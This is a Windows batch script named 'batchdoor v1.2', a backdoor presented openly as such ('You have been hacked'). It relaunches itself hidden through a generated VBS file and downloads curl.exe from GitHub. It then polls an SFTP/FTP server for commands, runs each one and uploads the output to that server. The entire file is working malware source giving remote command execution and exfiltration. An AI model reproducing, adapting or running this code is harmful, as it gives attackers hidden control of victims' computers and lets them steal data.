@echo off
title batchdoor v1.2 :)
if exist h.vbs (
goto s
) else (
echo Set WshShell = CreateObject^("WScript.Shell"^) > h.vbs
          echo WshShell.Run chr(34^) ^& "batchdoor.bat" ^& Chr(34^), 0 >> h.vbs
             echo Set WshShell = Nothing >> h.vbs
    cscript //B h.vbs
    goto eof
)
:s
del h.vbs
rem msg * You have been hacked :)
echo if.
if not exist curl.exe (
    rem if you want to use sftp leave this :)
curl -LJO https://github.com/gato001k1/project-batch-message-app/raw/main/curl.exe
set "curlpath2=%~dp0curl.exe"
goto c
) else (
    set "curlpath2=%~dp0curl.exe"
goto c
)
:c
rem set up the ip addresses manually can be sftp or ftp dont enter the sftp://
rem you can use ports
set "server2=1"
set "username2=1"
set "password2=1"
set "sftpmode2=sftp"
:loop2
if NOT EXIST sftpchecker (
    mkdir sftpchecker
    goto sftpchecked
) else (
    goto sftpchecked
)
:sftpchecked
if exist com (
    for %%A in (com) do set local_file_size=%%~zA
) else (
    set local_file_size=0
)
cd sftpchecker
"%curlpath2%" --user %username2%:%password2% -o com %sftpmode2%://%server2%/com -k
if exist com (
    for %%A in (com) do set server2_file_size=%%~zA
    cd ..
) else (
    set server2_file_size=0
    cd ..
)
rem bug
goto f
:f
if %local_file_size% equ %server2_file_size% (
    goto sftpchecked
) else (
   goto bug
)
:bug
    "%curlpath2%" --user %username2%:%password2% -o com %sftpmode2%://%server2%/com -k
    set /p comman=<com
    if "%comman%"=="exitser" (
        goto eof
    ) else (
        %cd% ~ >> hak
    %comman% >> hak
"%curlpath2%" -u %username2%:%password2% -T "hak" %sftpmode2%://%server2% -k
    goto sftpchecked
    )
:eof
exit
